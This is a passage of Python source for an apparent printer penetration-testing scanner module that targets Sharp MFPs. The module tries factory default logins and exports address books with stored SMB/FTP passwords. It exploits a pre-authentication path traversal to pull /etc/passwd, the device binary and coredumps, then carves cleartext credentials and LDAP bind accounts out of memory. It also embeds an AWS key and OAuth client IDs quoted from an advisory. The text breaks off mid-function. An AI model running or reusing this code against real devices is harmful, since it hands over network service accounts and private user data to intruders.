#!/usr/bin/env python3
"""
Sharp MFP module (MX / BP / AR / DX series web interface).

Derived from a captured administrator login against a Sharp MX-M6071:

    GET  /login.html?/addressbook.html          -> login form + token2 + MFPSESSIONID
    POST /login.html?/addressbook.html
         ggt_select(10009)=3&ggt_textbox(10003)=admin&action=loginbtn
         &token2=<per-session>&ordinate=0&ggt_hidden(10008)=5
    <-   302 Moved Temporarily, Location: /addressbook.html, fresh MFPSESSIONID

Two things make Sharp different from Ricoh:

  * The login name is a <select> of roles rather than free text. On a device in
    administrator-authority mode the only option is "Administrator" (value 3).
    Devices running user authentication expose a free-text login name field,
    ggt_textbox(10002), which this module fills in when present.
  * Every login form carries a one-shot CSRF token (token2) that must be
    scraped from the form immediately before posting, on the same session
    cookie. Replaying a stale token fails.
"""
import base64
import binascii
import csv
import html as html_module
import io
import os
import re
import zlib
from typing import Dict, List, Optional, Tuple
from urllib.parse import unquote_plus

import requests
from requests.exceptions import RequestException

from .base import (
    BROWSER_UA,
    Account,
    http_get,
    http_post,
    LoginResult,
    PrinterModule,
    RecoveredCredential,
    ScanContext,
    Target,
    VulnFinding,
    log_request,
    log_response,
    page_title,
    parse_set_cookies,
    printable_strings,
)

LOGIN_PATH = "/login.html"
# The query string on login.html is the page the device sends you to after a
# successful login. addressbook.html requires administrator authority, so it
# both drives the form into admin mode and doubles as a privilege confirmation.
POST_LOGIN_TARGET = "/addressbook.html"

# Sharp exposes more than one privileged login. Each is a shim that redirects to
# /login.html?/<target>, and the target page fixes which authority the login
# form's role dropdown - ggt_select(10009) - offers:
#
#   /service_login.html -> /login.html?/service_testpage.html   role 4 "Service"
#   /fss_default.html   -> /login.html?/fss_default.html        role 7 "FSS"
#
# The login exchange is otherwise identical to the administrator flow, so the
# module only has to point attempt_login() at the right target page. The role
# value itself is read from the form, never hard-coded, since it is the only
# option the target page presents.
SERVICE_LOGIN_TARGET = "/service_testpage.html"
FSS_LOGIN_TARGET = "/fss_default.html"
ROLE_TARGETS = {
    "administrator": POST_LOGIN_TARGET,
    "service": SERVICE_LOGIN_TARGET,
    "fss": FSS_LOGIN_TARGET,
}

# Data Import/Export (CSV Format), under System Settings. Exporting is a three
# step dance: scrape the form for its tokens, POST the export request, then
# follow the 302 to the generated CSV.
STORAGE_BACKUP_PATH = "/sysmgt_storagebackup_csv.html"
EXPORT_RADIO_FIELD = "ggt_radio(50)"
EXPORT_TYPE_ADDRESS_BOOK = "33"     # the other option, 23, is User Register Information

# Scan-to-folder destinations ride in the same address book CSV as contacts.
# Each protocol spreads over a group of columns sharing a prefix; a row is a
# folder destination when any of its location or credential columns is filled.
# (label, prefix) - column names are matched case-insensitively as <prefix>-*.
SCAN_FOLDER_PROTOCOLS = [("FTP", "ftp"), ("SMB", "smb"), ("Desktop", "desktop"),
                         ("NetFolder", "netfolder")]
_FOLDER_HOST_COLS = ("host", "server")
_FOLDER_PATH_COLS = ("directory", "path", "folder")
_FOLDER_USER_COLS = ("username", "user")
_FOLDER_PASS_COLS = ("password", "passwd")

ROLE_SELECT_FIELD = "ggt_select(10009)"     # "Login Name" dropdown
LOGIN_NAME_FIELD = "ggt_textbox(10002)"     # free-text login name (user-auth mode)
PASSWORD_FIELD = "ggt_textbox(10003)"       # "Password"

_FORM_RE = re.compile(r"<form[^>]*name=\"login\"[^>]*>(.*?)</form>", re.S | re.I)


def _form_block(html: str, name: str) -> Optional[str]:
    """Pull out the inner HTML of a named <form>."""
    pattern = re.compile(r"<form[^>]*name=\"" + re.escape(name) + r"\"[^>]*>(.*?)</form>", re.S | re.I)
    m = pattern.search(html or "")
    return m.group(1) if m else None
_INPUT_RE = re.compile(r"<input\b([^>]*)>", re.S | re.I)
_SELECT_RE = re.compile(r"<select[^>]*name=\"([^\"]+)\"[^>]*>(.*?)(?:</select>)", re.S | re.I)
_OPTION_RE = re.compile(r"<option[^>]*value=\"([^\"]*)\"([^>]*)>\s*([^<]*)", re.S | re.I)
_ATTR_RE = re.compile(r"(\w[\w-]*)\s*=\s*\"([^\"]*)\"", re.S)
_MODEL_RE = re.compile(r"[-–]\s*([A-Z]{2}[A-Z0-9][A-Z0-9\-]*)\s*$")
EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")

ADDRESS_BOOK_PATH = "/addressbook.html"

# Pre-authenticated Local File Inclusion published in Pierre Kim's June 2024
# advisory (no-CVE section in that report). The device's manual-download
# handler at /installed_emanual_down.html reads whatever ``path=`` names,
# relative to /mnt/std_data, so a traversal of ../../../ hits the root of the
# printer's filesystem. /etc/passwd is small, harmless, always present, and
# unmistakable: a real device answers with a line starting root:...:0:0:. We
# use that as the safest possible confirmation - it does not touch coredumps
# (which carry cleartext user passwords) or the /mnt/std04/DBMS/uaccnt
# configuration files (which are the pentester's real prize but also real
# user data that we have no reason to persist in this scanner's output).
LFI_PATH = "/installed_emanual_down.html"
LFI_PROBE_PATH_ARG = "/manual/../../../etc/passwd"
_LFI_PASSWD_RE = re.compile(r"^root:[^:\n]*:0:0:", re.M)

# Sharp advisory (JVN VU#93051062, published 2024-05-31), covered by:
#   https://global.sharp/products/copier/info/info_security_2024-05.html
# Referenced by every advisory finding below as the remediation pointer.
SHARP_ADVISORY = "Sharp advisory JVN#VU93051062 (2024-05-31)"

# The main binary path the LFI is chained to. When the /etc/passwd probe
# succeeds we know the traversal works, so we grab /tmp/main/main and grep
# for the exact hardcoded secrets Pierre Kim called out in the June 2024
# advisory. Only a byte-for-byte match on this device is treated as proof.
# The MX-M6071 binary is ~82 MB and the hardcoded strings live at
# offsets 43M and 81M, so the ceiling has to be well above 80 MB or the
# strings sit past truncation and every device reads as a false negative.
MAIN_BINARY_PATH_ARG = "/manual/../../../tmp/main/main"
MAIN_BINARY_MAX_BYTES = 128 * 1024 * 1024

# Verbatim strings from the advisory. Byte-strings so we can search the
# binary payload without decoding.
GOOGLE_CLIENT_IDS = (
    b"265490466885-m5cjvglv9q8aak493cgepe7juvafgh8c.apps.googleusercontent.com",
    b"347970444986-0pij6u2tfhb240edjmls3h1u8qm2v2b3.apps.googleusercontent.com",
    b"410988772526-6ujegl6jvquh9kstiegva8fk5j2ogag9.apps.googleusercontent.com",
    b"292646726735-033ggn9hmlrs8bntrj0fbstob9m8qt26.apps.googleusercontent.com",
)
AWS_API_KEY = b"PBYXSIK6av8fBt8Qe1EQUaF9ZaKvTDutaXS9YwWA"
AWS_POSTMAN_TOKEN = b"44688039-5104-39be-f974-c1f5ef621a5f"
AWS_ANALYTICS_ENDPOINT = (
    b"7db3z5d116.execute-api.ap-northeast-1.amazonaws.com/prod/MFPDataAlalytics"
)

# ---------------------------------------------------------------------------
# Credential recovery
# ---------------------------------------------------------------------------
# Detecting that a printer stores a scan-to-folder or LDAP bind password is
# only half a finding. The credential is a real service account on the
# client's network - usually one with write access to a file share, often a
# domain account - so recovering it in cleartext is what turns "the MFP holds
# a password" into "the MFP hands out a domain service account". Three
# independent sources, cheapest first:
#
#   1. The address book CSV we already exported. Sharp ships the stored
#      FTP/SMB/Desktop passwords in the export itself, alongside a companion
#      "<field>/@encodingMethod" column naming how the value was encoded.
#   2. The authenticated LDAP settings page, /nw_ldap_entry.html?ldapid=N.
#   3. The pre-auth LFI, chained to the printer's coredumps. Per Pierre Kim's
#      June 2024 advisory these are world-readable and hold cleartext
#      passwords for every account "even when the admin user has not been
#      logged-in the printer since the printer booted". This is the route that
#      works when the default credentials have already been changed.

# Sharp's CSV import/export declares an encoding per credential field rather
# than committing to one, because the same file has to round-trip values that
# are not valid CSV text. An empty method means the value is literal.
_ENCODING_PLAIN = {"", "none", "plain", "text", "0"}
_ENCODING_BASE64 = {"base64", "b64", "1"}
_ENCODING_HEX = {"hex", "hexadecimal", "2"}

# LDAP address book / authentication servers. The advisory drives this page
# for CVE-2024-34162; we only read it. ldapid is a zero-based index and the
# firmware exposes a handful of slots, so we walk until a slot comes back
# without a usable form.
LDAP_ENTRY_PATH = "/nw_ldap_entry.html"
LDAP_MAX_ENTRIES = 6

# Field-label heuristics for the LDAP settings form. The ggt_textbox() ids on
# that page vary between firmware families, so classifying by the label the
# device renders next to each box is more durable than pinning ids that only
# hold on the one model we happened to test. Ordered: the first pattern that
# matches a label wins, so "user name" is checked before the looser "name".
_LDAP_FIELD_HINTS = (
    ("password", ("password", "passwd", "pwd")),
    ("username", ("user name", "username", "login name", "bind dn", "bind name",
                  "account name", "user id")),
    ("server", ("server name", "server address", "host name", "hostname",
                "ldap server", "server")),
    ("port", ("port",)),
    ("search_root", ("search root", "search base", "base dn", "root dn",
                     "search condition")),
    ("domain", ("domain",)),
    ("name", ("name",)),
)
_LDAP_INPUT_RE = re.compile(r"<input\b([^>]*)>", re.S | re.I)
_LABEL_CELL_RE = re.compile(r"<t([dh])[^>]*>(.*?)</t\1>", re.S | re.I)
_LDAP_LABEL_WINDOW = 400

# Coredumps, per the advisory: world-readable (-rw-r--r--) under /mnt/log,
# gzip-compressed, and split into numbered parts (core-main.log.gz.001 was
# 17,316,455 bytes on the reporter's MX-M6071). We try the split part first
# because that is the name the advisory actually demonstrates, then the
# unsplit and error variants.
COREDUMP_DIR = "/manual/../../../mnt/log/"
COREDUMP_FILES = (
    "core-main.log.gz.001",
    "core-main.log.gz",
    "ERR_core-main.log.gz.001",
    "ERR_core-main.log.gz",
)
# The user account database. Binary with embedded account-name strings; it
# confirms which accounts exist on the device even when no coredump is present.
UACCNT_FILES = (
    "/manual/../../../mnt/std04/DBMS/uaccnt/9.01",
    "/manual/../../../mnt/std04/DBMS/uaccnt/1.01",
)

# Structured markers inside a decompressed coredump. The main binary serves
# the web UI, so login and settings POST bodies are still resident in the heap
# it dumped. A hit on one of these is not a guess: it is the verbatim body of
# a form submission, with the field name the device itself assigned. That is
# what makes these 'verified' rather than 'candidate'.
# A form value runs until the first byte that cannot be part of one. Spelt as
# printable-ASCII-minus-delimiters rather than as a negated class: a coredump
# puts no delimiter after the last field of a fragment - raw heap follows it -
# so a class that permits high bytes swallows binary into the password.
_FORM_VALUE = r"(?:(?![&\"'<>])[\x21-\x7e])"
_MEM_LOGIN_PW_RE = re.compile(
    (PASSWORD_FIELD.replace("(", r"\(").replace(")", r"\)")
     + r"=(" + _FORM_VALUE + r"{1,64})").encode()
)
_MEM_LOGIN_USER_RE = re.compile(
    (LOGIN_NAME_FIELD.replace("(", r"\(").replace(")", r"\)")
     + r"=(" + _FORM_VALUE + r"{1,64})").encode()
)
# Everything else is a pattern match over unstructured memory, so it is
# reported as a candidate. Keyed on the field/config name that precedes the
# value, which is how both the CSV columns (ftp-password, smb-password) and
# the device's own settings serialisation spell it.
_MEM_KV_PW_RE = re.compile(
    (r"(?i)\b([a-z0-9_.\-]{0,24}(?:password|passwd|bindpw|pwd))"
     r"\s*[=:]\s*[\"']?((?:(?![&\"'<>,;])[\x21-\x7e]){3,64})").encode()
)
# Values the device stores as placeholders, format strings, or masks. None of
# these is a password and every one of them shows up in a memory dump.
_MEM_JUNK_VALUES = {
    "null", "(null)", "nil", "none", "true", "false", "yes", "no", "0", "1",
    "password", "passwd", "pwd", "xxxx", "****", "n/a", "undefined", "-",
}
_MEM_JUNK_RE = re.compile(r"^[\W_]+$|%[sdxu]|^\*+$|^x+$|^0x[0-9a-f]+$", re.I)


def _label_before(page: str, position: int) -> str:
    """
    The label a settings page renders beside the input at ``position``.

    Sharp lays these pages out as ``<td>Label</td><td><input ...></td>``, so the
    last cell that *closed* before the input is the label for it. Taking a flat
    tail of the preceding text instead runs backwards across the previous row -
    which makes "Port Number" look like it says "Server Name", and quietly
    misfiles every field after the first.
    """
    window = page[max(0, position - _LDAP_LABEL_WINDOW):position]
    cells = _LABEL_CELL_RE.findall(window)
    for _tag, raw in reversed(cells):
        text = _cell_text(raw).strip().lower()
        if text:
            return text[:60]
    return _cell_text(window).strip().lower()[-60:]


def _decode_export_value(value: str, method: str) -> Tuple[str, str]:
    """
    Turn a CSV credential cell into cleartext, honouring the companion
    "<field>/@encodingMethod" column.

    Returns (cleartext, note). The note is empty when the value needed no
    decoding or decoded cleanly; when the declared method is one we do not
    know, the raw value is returned unchanged and the note says so, because a
    password we cannot decode is still worth reporting verbatim - the operator
    can decode it by hand rather than being told nothing was found.
    """
    raw = (value or "").strip()
    if not raw:
        return "", ""
    how = (method or "").strip().strip('"').lower()

    if how in _ENCODING_PLAIN:
        return raw, ""
    if how in _ENCODING_BASE64:
        try:
            decoded = base64.b64decode(raw + "=" * (-len(raw) % 4), validate=True)
        except (binascii.Error, ValueError):
            return raw, f"declared base64 but did not decode; value shown as stored"
        return decoded.decode("utf-8", errors="replace"), ""
    if how in _ENCODING_HEX:
        try:
            return bytes.fromhex(raw).decode("utf-8", errors="replace"), ""
        except ValueError:
            return raw, "declared hex but did not decode; value shown as stored"
    return raw, f"unrecognised encodingMethod '{how}'; value shown as stored"


def _looks_like_password(value: str) -> bool:
    """Filter for values grepped out of unstructured memory."""
    v = (value or "").strip()
    if len(v) < 3 or len(v) > 64:
        return False
    if v.lower() in _MEM_JUNK_VALUES:
        return False
    if _MEM_JUNK_RE.search(v):
        return False
    # A run of memory that is one long word of hex or a path is far more likely
    # to be a token, a filename, or a pointer than a stored password.
    if v.startswith(("/", "\\", "http://", "https://")):
        return False
    if any(ord(ch) < 0x20 or ord(ch) > 0x7e for ch in v):
        return False
    return True


_TABLE_RE = re.compile(r"<table[^>]*>(.*?)</table>", re.S | re.I)
_ROW_RE = re.compile(r"<tr[^>]*>(.*?)</tr>", re.S | re.I)
_CELL_RE = re.compile(r"<t([dh])[^>]*>(.*?)</t\1>", re.S | re.I)
_TAG_RE = re.compile(r"<[^>]+>")
# Each row carries the entry's member id, both as a hidden field and as the
# middle field of the checkbox value ("<index>,<memberid>,<name>"). It is the
# only reliable identity: two distinct contacts can share a name and an address.
_ROW_ID_RE = re.compile(r"addressbook_adrlistprofid\((\d+)\)", re.I)
_ROW_ID_ALT_RE = re.compile(r'value="\d+,(\d+),', re.I)
_TOTAL_RE = re.compile(r"Total\s+Address\w*\s*:?\s*(\d+)", re.I)
# "Total Address: 81   1 / 9" -> total, current page, page count
_PAGE_RE = re.compile(r"Total\s+Address\w*\s*:?\s*(\d+)\s+(\d+)\s*/\s*(\d+)", re.I)
_LIST_FORM = "adrbook"
PAGE_SIZE_FIELD = "ggt_select(9)"       # "Display Items": 10 / 20 / 50 / 100
# Every control on the list page submits the same form, and the device decides
# what to do from `action`, which the page's own validate() sets to the name of
# whichever control fired. So paging is action=nextbtn, and changing the page
# size is action=ggt_select(9) - not action=updatebtn.
NEXT_ACTION = "nextbtn"
# Safety net for the page walk: no address book should need more than this.
MAX_PAGE_WALK = 200
# What Sharp renders in a cell that holds nothing - including the single
# placeholder row an empty address book still draws.
_PLACEHOLDERS = {"", "-", "--", "------", "not set", "none"}


def _cell_text(raw: str) -> str:
    """Flatten a table cell to plain text, entities and &nbsp; included."""
    text = html_module.unescape(_TAG_RE.sub(" ", raw or ""))
    return " ".join(text.replace("\xa0", " ").split())


def read_pagination(page: str) -> Tuple[Optional[int], int, int]:
    """Return (total_entries, current_page, page_count) from the list header."""
    flat = html_module.unescape(_TAG_RE.sub(" ", page or ""))
    paged = _PAGE_RE.search(flat)
    if paged:
        return int(paged.group(1)), int(paged.group(2)), int(paged.group(3))
    total = _TOTAL_RE.search(flat)
    return (int(total.group(1)) if total else None), 1, 1


def list_form_state(page: str) -> Dict[str, str]:
    """
    Rebuild the address book form's current state: hidden fields plus whichever
    option each <select> currently has selected. Per-row profile id fields are
    dropped - they describe the rows on screen, not the query.
    """
    body = _form_block(page or "", _LIST_FORM)
    if body is None:
        return {}
    state: Dict[str, str] = {}
    for blob in _INPUT_RE.findall(body):
        attrs = _attrs(blob)
        name = attrs.get("name")
        if not name or attrs.get("type", "").lower() != "hidden":
            continue
        if name.startswith("addressbook_adrlistprofid"):
            continue
        state[name] = attrs.get("value", "")
    for name, inner in _SELECT_RE.findall(body):
        selected = [value for value, flags, _text in _OPTION_RE.findall(inner) if "selected" in flags]
        options = _OPTION_RE.findall(inner)
        state[name] = selected[0] if selected else (options[0][0] if options else "")
    return state


def largest_page_size(page: str) -> Optional[str]:
    """The form value behind the biggest "Display Items" option (usually 100)."""
    body = _form_block(page or "", _LIST_FORM)
    if body is None:
        return None
    for name, inner in _SELECT_RE.findall(body):
        if name != PAGE_SIZE_FIELD:
            continue
        best_value, best_size = None, -1
        for value, _flags, text in _OPTION_RE.findall(inner):
            digits = re.sub(r"\D", "", text)
            if digits and int(digits) > best_size:
                best_value, best_size = value, int(digits)
        return best_value
    return None


def parse_address_table(page: str) -> List[Tuple[str, str, str]]:
    """
    Pull (name, email, row_id) out of the address book table.

    Columns are located from the header row rather than assumed by position -
    the visible set varies by model and by which destination types are in use.
    row_id is the device's member id where the row exposes one, which is what
    makes de-duplication across pages safe.
    """
    for table in _TABLE_RE.findall(page or ""):
        name_col: Optional[int] = None
        mail_col: Optional[int] = None
        entries: List[Tuple[str, str, str]] = []

        for row in _ROW_RE.findall(table):
            cells = _CELL_RE.findall(row)
            if not cells:
                continue
            texts = [_cell_text(value) for _kind, value in cells]

            if any(kind.lower() == "h" for kind, _value in cells):
                for index, text in enumerate(t.lower() for t in texts):
                    if "address name" in text or text == "name":
                        name_col = index
                    elif "e-mail" in text or "email" in text:
                        mail_col = index
                continue

            if name_col is None or name_col >= len(texts):
                continue
            name = texts[name_col]
            email = ""
            if mail_col is not None and mail_col < len(texts):
                candidate = texts[mail_col]
                if "@" in candidate:
                    email = candidate
            if name.lower() in _PLACEHOLDERS and not email:
                continue
            if not (name or email):
                continue
            row_id = ""
            found = _ROW_ID_RE.search(row) or _ROW_ID_ALT_RE.search(row)
            if found:
                row_id = found.group(1)
            entries.append((name, email, row_id or f"pos:{len(entries)}:{name}:{email}"))

        if entries:
            return entries
    return []


def _attrs(blob: str) -> Dict[str, str]:
    return {k.lower(): v for k, v in _ATTR_RE.findall(blob)}


def _safe_asset_name(hostport: str) -> str:
    """Turn '192.0.2.59:443' into a filename-safe token '192.0.2.59_443'."""
    return hostport.replace(":", "_").replace("/", "_").replace("\\", "_")


def _write_evidence(ctx: ScanContext, target: Target, kind: str,
                    payload: bytes) -> str:
    """
    Persist a proof-of-concept artifact to ``<output_dir>/<kind>_<hostport>.txt``
    and return the relative filename. The client re-opens this file to
    confirm the finding independently.

    Naming keeps evidence per (host, port) so a device exposed on both 80
    and 443 gets one file per endpoint rather than clobbering itself.
    """
    filename = f"{kind}_{_safe_asset_name(target.hostport)}.txt"
    path = os.path.join(ctx.output_dir, filename)
    with open(path, "wb") as f:
        f.write(payload)
    return filename


def _render_binary_excerpts(target: Target, request_url: str, body: bytes,
                            matches: List[Tuple[str, int]], subject: str) -> str:
    """
    Human-readable proof rendered from a byte-level match in the fetched
    binary. Includes the request URL that produced the binary, the byte
    offset of each match, and a 96-byte window around each hit rendered
    both as hex and as printable ASCII with non-printables shown as '.'.

    The rendering itself is the reproducible artifact: the client can compare
    the hex/ASCII windows against their own recovery of /tmp/main/main.
    """
    window = 48
    header_lines = [
        f"# Sharp MFP binary-chain evidence",
        f"# Subject: {subject}",
        f"# Target: {target.base_url}",
        f"# Request: GET {request_url}",
        f"# Binary length pulled: {len(body)} bytes",
        f"# Matches: {len(matches)}",
        "# --- per-match excerpts follow (offset, hex, printable ASCII) ---",
        "",
    ]
    excerpts: List[str] = []
    for value, offset in matches:
        start = max(0, offset - window)
        end = min(len(body), offset + len(value.encode()) + window)
        chunk = body[start:end]
        hex_lines = _hexdump(chunk, base=start)
        excerpts.extend([
            f"## match: {value}",
            f"   offset: 0x{offset:x} ({offset})",
            f"   window: bytes 0x{start:x}..0x{end:x} ({end - start} bytes)",
            "",
            hex_lines,
            "",
        ])
    return "\n".join(header_lines + excerpts)


def _gunzip_partial(raw: bytes) -> bytes:
    """
    Decompress a gzip stream that is very probably truncated.

    Coredumps are split into numbered parts and we cap the download, so the
    bytes in hand are almost never a complete member. gzip.decompress() throws
    the whole thing away in that case; a raw decompressobj keeps everything it
    managed to inflate before it ran out, which is the part we want. The output
    is capped as well - a coredump is compressed memory and inflates hard.
    """
    ceiling = 512 * 1024 * 1024
    out = bytearray()
    obj = zlib.decompressobj(16 + zlib.MAX_WBITS)
    try:
        for i in range(0, len(raw), 1 << 20):
            out.extend(obj.decompress(raw[i:i + (1 << 20)], ceiling - len(out)))
            if len(out) >= ceiling or obj.eof:
                break
    except zlib.error:
        pass    # truncated stream: keep whatever inflated cleanly
    return bytes(out)


_ROLE_SELECT_RE = re.compile(
    (ROLE_SELECT_FIELD.replace("(", r"\(").replace(")", r"\)") + r"=(\d+)").encode()
)
# Role values as documented in the advisory and confirmed against the login
# forms this module already drives. Anything else is reported by number rather
# than guessed at.
_ROLE_VALUE_NAMES = {"3": "Administrator", "4": "Service", "7": "FSS"}

_HOST_NEAR_RE = re.compile(
    rb"(?i)(?:\\\\[A-Za-z0-9_.\-]+(?:\\[A-Za-z0-9_.$\-]+)?"
    rb"|(?:ftp|smb|ldaps?|cifs)://[A-Za-z0-9_.\-]+(?::\d+)?"
    rb"|\b(?:\d{1,3}\.){3}\d{1,3}\b)"
)
_USER_NEAR_RE = re.compile(
    rb"(?i)\b[a-z0-9_.\-]{0,16}(?:username|user|userid|uid|logon|account)"
    rb"\s*[=:]\s*[\"']?([A-Za-z0-9_.\\@\-]{2,64})"
)
# LDAP binds as a distinguished name - "CN=svc-printer,OU=Service,DC=corp,DC=local" -
# which the username pattern above truncates at the first '='.
_BINDDN_NEAR_RE = re.compile(
    rb"(?i)\b[a-z0-9.\-]{0,16}_?(?:binddn|bind_dn|bind-dn|bindname|bind_user|rootdn)"
    rb"\s*[=:]\s*[\"']?((?:[A-Za-z]{1,4}=[^,\x00\r\n]{1,64})(?:,[A-Za-z]{1,4}=[^,\x00\r\n]{1,64}){0,12})"
)
# Hosts are far more reliably read from the device's own "<something>host=" /
# "server=" serialisation than guessed at from bare dotted names, which in a
# memory dump match filenames and version strings as readily as hostnames.
_HOST_KV_RE = re.compile(
    rb"(?i)\b[a-z0-9_.\-]{0,16}(?:host|server|address)"
    rb"\s*[=:]\s*[\"']?([A-Za-z0-9][A-Za-z0-9_.\-]{1,79})"
)
# How far either side of a password hit we are willing to look for the host and
# account it belongs to. Wide enough to span a settings record, narrow enough
# that the association still means something.
_NEIGHBOUR_WINDOW = 512


def _role_from_post_body(window: bytes) -> str:
    """Map the role value in a recovered login POST body to its account name."""
    match = None
    for match in _ROLE_SELECT_RE.finditer(window):
        pass    # the closest preceding selection is the one that belongs to us
    if not match:
        return ""
    value = match.group(1).decode()
    return _ROLE_VALUE_NAMES.get(value, f"role {value}")


def _nearest_host(blob: bytes, offset: int, scheme: str = "") -> str:
    """
    Best-effort host for a credential found in raw memory.

    Association by proximity is a heuristic, which is exactly why every
    finding that relies on it is reported as a candidate rather than verified.
    """
    window = blob[max(0, offset - _NEIGHBOUR_WINDOW):offset + _NEIGHBOUR_WINDOW]
    matches = [m.group().decode("ascii", errors="replace") for m in _HOST_NEAR_RE.finditer(window)]
    if scheme:
        preferred = [m for m in matches if m.lower().startswith(scheme)]
        if preferred:
            return preferred[0]
    if matches:
        return matches[0]
    keyed = _HOST_KV_RE.search(window)
    return keyed.group(1).decode("ascii", errors="replace") if keyed else ""


def _nearest_username(blob: bytes, offset: int) -> str:
    """The account name sitting nearest a password hit, or a placeholder."""
    window = blob[max(0, offset - _NEIGHBOUR_WINDOW):offset + _NEIGHBOUR_WINDOW]
    match = _BINDDN_NEAR_RE.search(window) or _USER_NEAR_RE.search(window)
    if not match:
        return "(username not recovered)"
    return unquote_plus(match.group(1).decode("ascii", errors="replace"))


def _render_credential_evidence(target: Target, source_file: str,
                                creds: List["RecoveredCredential"]) -> str:
    """
    Proof-of-concept artifact for credentials recovered out of device memory.

    Records the request that produced the dump and, per credential, the byte
    offset it was found at and the confidence it carries, so the client can
    reproduce the recovery rather than take the tool's word for it.
    """
    lines = [
        "# Sharp MFP recovered-credential evidence",
        f"# Target: {target.base_url}",
        f"# Source: GET {LFI_PATH}?path={COREDUMP_DIR}{source_file}"
        if source_file else "# Source: device settings pages",
        "# Reference: Pierre Kim, \"Sharp MFP - 17 vulnerabilities\", 2024-06-27",
        "#",
        "# WARNING: this file contains live credentials for the client's network.",
        "# Handle it as evidence, store it with the engagement, and destroy it on close.",
        "#",
        "# --- recovered credentials follow ---",
        "",
    ]
    for cred in creds:
        lines.extend([
            f"## [{cred.confidence}] {cred.kind}",
            f"   scope:    {cred.scope}",
            f"   username: {cred.username}",
            f"   password: {cred.password}",
            f"   source:   {cred.source}",
            f"   detail:   {cred.detail}",
            "",
        ])
    return "\n".join(lines)


def _hexdump(data: bytes, base: int = 0) -> str:
    """`xxd`-style dump: `offset  <32 hex>  <16 ascii>` per row."""
    rows: List[str] = []
    for i in range(0, len(data), 16):
        chunk = data[i:i + 16]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        hex_part = hex_part.ljust(16 * 3 - 1)
        ascii_part = "".join(
            chr(b) if 32 <= b < 127 else "." for b in chunk
        )
        rows.append(f"{base + i:08x}  {hex_part}  |{ascii_part}|")
    return "\n".join(rows)


class LoginForm:
    """The parsed contents of a Sharp login form."""

    def __init__(self, html: str, name: str = "login"):
        body = _form_block(html, name)
        self.raw = body if body is not None else (html or "")
        self.fields: Dict[str, str] = {}
        self.field_types: Dict[str, str] = {}
        for blob in _INPUT_RE.findall(self.raw):
            a = _attrs(blob)
            name = a.get("name")
            if not name:
                continue
            self.field_types[name] = a.get("type", "text").lower()
            self.fields[name] = a.get("value", "")
        self.selects: Dict[str, List[Tuple[str, str]]] = {}
        for name, inner in _SELECT_RE.findall(self.raw):
            self.selects[name] = [
                (value, text.strip()) for value, _flags, text in _OPTION_RE.findall(inner)
            ]

    @property
    def token(self) -> str:
        return self.fields.get("token2", "")

    @property
    def usable(self) -> bool:
        """A real Sharp login form always exposes the password field."""
        return PASSWORD_FIELD in self.fields

    def role_value(self, wanted: str) -> Optional[str]:
        """Resolve an account label to a value in the Login Name dropdown."""
        options = self.selects.get(ROLE_SELECT_FIELD)
        if not options:
            return None
        wanted_l = (wanted or "").strip().lower()
        for value, text in options:
            if text.lower() == wanted_l or wanted_l in text.lower():
                return value
        return options[0][0]


class SharpModule(PrinterModule):
    name = "sharp"
    display_name = "Sharp MFP"
    supports_export = True
    supports_scrape = True
    supports_vuln_checks = True
    supports_credential_recovery = True
    export_note = (
        "Exports via System Settings > Data Import/Export (CSV). The CSV carries stored "
        "FTP/SMB credentials for scan-to-folder destinations as well as contacts."
    )
    default_accounts = [
        Account(
            label="Administrator",
            username="Administrator",
            password="admin",
            can_export=True,
            note="Sharp factory default administrator password",
        ),
        # Technician logins. Their username doubles as the ROLE_TARGETS key that
        # points attempt_login() at the matching login target page. Neither
        # reaches System Settings > Data Import/Export, so can_export is False:
        # a Service/FSS session confirms the default credential but the address
        # book is still harvested by the unauthenticated scrape.
        Account(
            label="Service",
            username="Service",
            password="service",
            can_export=False,
            note="Sharp factory default service-mode password",
            risk_note="Technician-level service account - grants access to diagnostic functions; prioritise remediation",
        ),
        Account(
            label="FSS",
            username="FSS",
            password="servicefss",
            can_export=False,
            note="Sharp factory default FSS (field service) password",
            risk_note="Technician-level field-service account - grants access to diagnostic functions; prioritise remediation",
        ),
    ]

    # ---- fingerprint ---------------------------------------------------
    def fingerprint(self, target: Target, ctx: ScanContext) -> Tuple[bool, str]:
        url = f"{target.base_url}{LOGIN_PATH}"
        headers = {
            "User-Agent": BROWSER_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        log_request(ctx, "SHARP CHECK", target.hostport, "GET", url, headers)
        try:
            resp = http_get(url, ctx, headers=headers, allow_redirects=False)
        except RequestException as exc:
            return False, f"Connection error: {exc.__class__.__name__}"

        log_response(ctx, "SHARP CHECK RESPONSE", target.hostport, resp, body_limit=500)

        text = resp.text or ""
        server = resp.headers.get("Server", "")
        set_cookie = resp.headers.get("Set-Cookie", "")

        # Definitive markers: a proprietary Sharp response header and the
        # MFPSESSIONID session cookie the Sharp web stack issues.
        strong: List[str] = []
        if any(h.lower().startswith("extend-sharp") for h in resp.headers):
            strong.append("Extend-sharp-* header")
        if "MFPSESSIONID" in set_cookie:
            strong.append("MFPSESSIONID cookie")

        # Supporting markers. "Rapid Logic" is a generic embedded web server
        # used by more than just Sharp, so it never counts on its own.
        weak: List[str] = []
        if "rapid logic" in server.lower():
            weak.append("Server: Rapid Logic")
        if "ggt_textbox(" in text or "ggt_select(" in text:
            weak.append("Sharp ggt_* form fields")
        title = page_title(text)
        if title:
            weak.append(f"title '{title}'")

        model = ""
        m = _MODEL_RE.search(title)
        if m:
            model = m.group(1)

        if strong or len(weak) >= 2:
            found = strong + weak
            reason = f"Sharp MFP detected (found: {', '.join(found[:3])})"
            if model:
                reason += f" [model {model}]"
            return True, reason

        if resp.status_code == 404:
            return False, f"Not a Sharp MFP (HTTP {resp.status_code} - {LOGIN_PATH} not found)"
        return False, f"Not a Sharp MFP (no Sharp indicators, HTTP {resp.status_code})"

    # ---- login ---------------------------------------------------------
    def attempt_login(self, target: Target, account: Account, ctx: ScanContext) -> LoginResult:
        # The target page after "?" selects which authority the login form
        # offers. Administrator accounts (and any --accounts override) fall back
        # to the address book page; Service/FSS route to their own pages.
        target_page = ROLE_TARGETS.get(account.username.strip().lower(), POST_LOGIN_TARGET)
        login_url = f"{target.base_url}{LOGIN_PATH}?{target_page}"
        result = LoginResult(target=target, vendor=self.name, account=account, outcome="FAIL")

        headers = {
            "User-Agent": BROWSER_UA,
